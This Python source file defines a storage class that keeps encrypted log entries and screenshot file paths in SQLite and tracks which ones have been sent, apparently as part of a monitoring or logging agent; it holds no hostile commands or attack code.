import sqlite3
import json
from cryptography.fernet import Fernet
import os
from config import Config

class Storage:
    def __init__(self):
        self.db_path = Config.DB_PATH
        self.key = self._get_or_create_key()
        self.cipher = Fernet(self.key)
        self._init_db()
        
    def _get_or_create_key(self):
        key_path = os.path.join(Config.DATA_DIR, "secret.key")
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_path, "wb") as f:
                f.write(key)
            return key

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      log_type TEXT, 
                      content BLOB, 
                      timestamp REAL,
                      sent INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS screenshots
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      file_path TEXT,
                      timestamp REAL,
                      sent INTEGER DEFAULT 0)''')
        conn.commit()
        conn.close()

    def encrypt(self, data):
        return self.cipher.encrypt(json.dumps(data).encode())

    def decrypt(self, data):
        return json.loads(self.cipher.decrypt(data).decode())

    def save_log(self, log_type, data, timestamp):
        encrypted_data = self.encrypt(data)
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT INTO logs (log_type, content, timestamp) VALUES (?, ?, ?)",
                  (log_type, encrypted_data, timestamp))
        conn.commit()
        conn.close()

    def save_screenshot(self, file_path, timestamp):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT INTO screenshots (file_path, timestamp) VALUES (?, ?)",
                  (file_path, timestamp))
        conn.commit()
        conn.close()

    def get_pending_logs(self, limit=50):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT id, log_type, content, timestamp FROM logs WHERE sent=0 LIMIT ?", (limit,))
        rows = c.fetchall()
        
        logs = []
        for row in rows:
            try:
                content = self.decrypt(row[2])
                logs.append({
                    "id": row[0],
                    "log_type": row[1],
                    "content": content,
                    "timestamp": row[3] # Keep as float/timestamp
                })
            except Exception as e:
                print(f"Error decrypting log {row[0]}: {e}")
        conn.close()
        return logs

    def mark_logs_sent(self, log_ids):
        if not log_ids: return
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        placeholders = ','.join('?' * len(log_ids))
        c.execute(f"UPDATE logs SET sent=1 WHERE id IN ({placeholders})", log_ids)
        conn.commit()
        conn.close()
        
    def get_pending_screenshots(self, limit=5):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT id, file_path, timestamp FROM screenshots WHERE sent=0 LIMIT ?", (limit,))
        rows = c.fetchall()
        conn.close()
        return [{"id": row[0], "file_path": row[1], "timestamp": row[2]} for row in rows]

    def mark_screenshot_sent(self, screenshot_id):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("UPDATE screenshots SET sent=1 WHERE id=?", (screenshot_id,))
        conn.commit()
        conn.close()
